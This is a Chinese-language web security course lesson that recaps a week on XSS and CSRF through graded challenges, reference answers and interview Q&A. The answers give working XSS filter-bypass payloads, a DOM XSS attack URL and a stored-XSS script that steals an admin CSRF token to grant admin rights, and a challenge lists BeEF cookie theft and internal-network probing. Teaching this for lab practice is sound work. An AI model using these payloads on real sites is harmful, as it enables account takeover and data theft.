---
title: Day044：Week 7 周末闯关 - XSS 与 CSRF 综合总结
tags:
  - 网络安全
  - XSS
  - CSRF
  - 周末挑战
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d044
date: 2026-03-07
updated: 2026-01-28
---

# Day044：Week 7 周末闯关 - XSS 与 CSRF 综合总结

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 7：XSS 进阶与 CSRF |
| **今日主题** | 周末挑战与知识总结 |
| **预计时间** | 3-4 小时 |
| **难度等级** | 综合挑战 |

---

## 今日痛点场景

> **场景**：这一周你学了 XSS 绕过、DOM XSS、CSRF、BeEF。现在是检验成果的时候了。
>
> **问题**：能不能综合运用所学，完成一次完整的客户端攻击链？
>
> **今天的任务**：综合挑战 + 知识总结，为下周的认证与逻辑漏洞做准备。

---

## 今日目标

- [ ] 完成综合挑战任务
- [ ] 回顾本周知识点
- [ ] 输出 Week 7 学习总结
- [ ] 为 Week 8 做准备

**闯关条件**：完成所有挑战任务。

---

## 综合挑战任务

### 挑战 1：XSS 绕过挑战（60 分钟）

**任务**：在以下过滤规则下成功执行 `alert(document.domain)`

**过滤规则**：
```php
$input = str_replace(array('<script>', '</script>', 'onerror', 'onload', 'alert'), '', strtolower($_GET['input']));
echo "<div>" . $input . "</div>";
```

**分析过滤**：
1. 转小写后替换
2. 过滤了 `<script>`、`onerror`、`onload`、`alert`
3. 替换为空（可能双写绕过）

**要求**：
1. 分析过滤逻辑
2. 构造绕过 Payload
3. 成功执行代码

**记录**：
```
过滤分析：________________
使用的绕过技巧：________________
成功的 Payload：________________
```

---

### 挑战 2：DOM XSS 挖掘（45 分钟）

**任务**：分析以下代码，找到 DOM XSS 并构造攻击

**漏洞代码**：
```html
<!DOCTYPE html>
<html>
<head>
  <title>Search Page</title>
</head>
<body>
  <h1>Search Results</h1>
  <div id="results"></div>

  <script>
    // 从 URL 获取搜索关键词
    var params = new URLSearchParams(window.location.search);
    var keyword = params.get('q');

    // 显示搜索结果
    if (keyword) {
      document.getElementById('results').innerHTML =
        'You searched for: <b>' + keyword + '</b>';
    }
  </script>
</body>
</html>
```

**要求**：
1. 识别 Source 和 Sink
2. 构造攻击 URL
3. 验证 XSS 执行

**记录**：
```
Source：________________
Sink：________________
攻击 URL：________________
```

---

### 挑战 3：CSRF + XSS 组合攻击（60 分钟）

**任务**：设计一个完整的攻击链

**场景**：
- 目标网站有一个存储型 XSS（评论功能）
- 管理员后台有一个修改用户权限的功能
- 修改权限的请求有 CSRF Token 保护

**攻击目标**：将普通用户提权为管理员

**攻击链设计**：
```
1. 在评论区注入 XSS
2. 管理员查看评论时触发 XSS
3. XSS 代码读取管理员页面的 CSRF Token
4. 使用 Token 发起请求，修改攻击者的权限
```

**Payload 设计**：
```javascript
// 你的攻击代码
```

**记录**：
```
攻击链步骤：________________
设计的 Payload：________________
```

---

### 挑战 4：BeEF 综合利用（45 分钟）

**任务**：利用 BeEF 完成以下目标

**目标清单**：
1. [ ] 获取受害者的 Cookie
2. [ ] 获取受害者的内网 IP
3. [ ] 探测内网网关（192.168.x.1）
4. [ ] 执行一次社会工程攻击

**记录**：
```
获取的 Cookie：________________
内网 IP：________________
网关开放端口：________________
社会工程结果：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 完成 XSS 绕过挑战 | 25 分 |
| 完成 DOM XSS 挖掘 | 20 分 |
| 完成 CSRF + XSS 组合设计 | 30 分 |
| 完成 BeEF 综合利用 | 25 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## Week 7 知识总结

### 本周学习内容

| 日期 | 主题 | 核心技能 |
|------|------|----------|
| Day 38 | XSS 绕过基础 | 大小写、双写、编码、标签替换 |
| Day 39 | XSS 绕过进阶 | SVG、伪协议、冷门事件、mXSS |
| Day 40 | DOM XSS | Source/Sink、数据流分析 |
| Day 41 | CSRF 原理 | GET/POST CSRF、Token 防御 |
| Day 42 | CSRF 绕过与 BeEF | Token 绕过、XSS+CSRF、BeEF 入门 |
| Day 43 | BeEF 进阶 | 内网探测、社会工程、持久化 |
| Day 44 | 周末挑战 | 综合运用 |

### 技能树更新

```
客户端攻击
├── XSS 攻击
│   ├── 反射型 XSS
│   ├── 存储型 XSS
│   ├── DOM XSS
│   │   ├── Source 识别
│   │   └── Sink 识别
│   └── XSS 绕过
│       ├── 编码绕过
│       ├── 标签变形
│       ├── 事件属性
│       └── SVG/伪协议
├── CSRF 攻击
│   ├── GET 型 CSRF
│   ├── POST 型 CSRF
│   ├── Token 绕过
│   └── XSS + CSRF 组合
└── 浏览器控制
    ├── BeEF 框架
    ├── 信息收集
    ├── 内网探测
    ├── 社会工程
    └── 持久化
```

### 面试高频问题

**Q1：XSS 有几种类型？区别是什么？**

A1：
1. **反射型**：恶意代码在 URL 中，服务器"反射"回页面
2. **存储型**：恶意代码存入数据库，持久化影响
3. **DOM 型**：恶意代码在浏览器端执行，不经过服务器

**Q2：如何防御 XSS？**

A2：
1. **输入验证**：过滤或拒绝危险字符
2. **输出编码**：HTML 实体编码、JavaScript 编码
3. **CSP**：Content Security Policy 限制脚本执行
4. **HttpOnly**：保护 Cookie 不被 JS 读取

**Q3：CSRF 和 XSS 有什么区别？**

A3：
- **XSS**：在目标网站执行恶意代码，窃取信息
- **CSRF**：利用用户身份发起恶意请求，执行操作
- **XSS 可以绕过 CSRF Token**：因为可以读取页面内容

**Q4：SameSite Cookie 是什么？**

A4：
- 浏览器的 Cookie 属性，控制跨站请求时是否携带 Cookie
- **Strict**：完全禁止跨站携带
- **Lax**：允许导航型 GET 请求携带（默认值）
- **None**：允许所有跨站请求携带（需要 Secure）

---

## 下周预告

**Week 8：认证与逻辑漏洞**

下周你将学习：
- 越权漏洞（水平/垂直）
- JWT 攻击
- 密码重置漏洞
- 验证码绕过

**目标**：掌握业务逻辑层面的漏洞挖掘

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| Week 7 总用时 | |
| 最大收获 | |
| 最大挑战 | |
| 下周期待 | |

---

## 综合挑战参考答案

### 挑战 1 参考

**过滤分析**：
- 转小写后替换，大小写绕过无效
- 替换为空，可以双写绕过

**Payload**：
```html
<img src=x oonnerrorerror=aalertlert(document.domain)>

<!-- 或使用未被过滤的事件 -->
<svg oonloadnload=prompt(document.domain)>

<!-- 或使用 confirm 代替 alert -->
<img src=x oonnerrorerror=confirm(document.domain)>
```

### 挑战 2 参考

**Source**：`window.location.search` → `params.get('q')`
**Sink**：`innerHTML`

**攻击 URL**：
```
http://target.com/search.html?q=<img src=x onerror=alert(document.domain)>
```

### 挑战 3 参考

```javascript
// 完整攻击 Payload（存储在评论中）
<script>
  // 1. 获取管理员页面
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '/admin/user-manage', false);
  xhr.send();

  // 2. 解析 CSRF Token
  var html = xhr.responseText;
  var token = html.match(/csrf_token.*?value="(.*?)"/)[1];

  // 3. 发起提权请求
  var form = document.createElement('form');
  form.action = '/admin/change-role';
  form.method = 'POST';
  form.innerHTML = '<input name="csrf_token" value="' + token + '">' +
                   '<input name="user_id" value="attacker_id">' +
                   '<input name="role" value="admin">';
  document.body.appendChild(form);
  form.submit();
</script>
```

---

> **导师点评**：
>
> 恭喜你完成了 Week 7！
>
> 这周你学的是"客户端攻击"——从 XSS 到 CSRF 到 BeEF，攻击目标从服务器转向了用户浏览器。
>
> 客户端攻击往往被低估。很多人觉得"XSS 不就是弹个窗吗？"但你现在知道了：XSS 可以窃取 Cookie、读取敏感信息、执行任意操作、甚至控制整个浏览器探测内网。
>
> 下周开始学逻辑漏洞——这是最难自动化检测的漏洞类型。越权、JWT、密码重置，这些漏洞靠的是"思维"而不是工具。
>
> **记住：工具能发现的漏洞，别人也能发现。逻辑漏洞才是体现你价值的地方**。

```bash
echo "Week 7 Complete! 客户端攻击大师！"
```
